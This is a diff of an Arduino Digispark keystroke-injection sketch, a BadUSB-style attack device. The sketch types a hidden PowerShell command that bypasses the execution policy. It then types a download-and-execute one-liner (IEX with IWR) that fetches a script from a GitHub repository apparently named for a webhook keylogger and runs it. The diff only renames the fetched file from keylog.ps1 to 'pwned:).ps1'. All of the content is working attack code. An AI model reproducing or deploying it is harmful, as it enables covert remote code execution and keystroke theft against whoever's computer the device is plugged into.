@@ -17,7 +17,7 @@ void setup() {
 DigiKeyboard.print("powershell -NoP -Win H -Noni -Exec Bypass");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(300);
-DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/keylog.ps1 -UseBasicParsing); Invoke-keylog.ps1;");
+DigiKeyboard.print("IEX(IWR https://raw.githubusercontent.com/ISykeI/Digispark_Keylogger_Webhook/main/pwned:).ps1 -UseBasicParsing); Invoke-pwned:).ps1;");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(400);
 
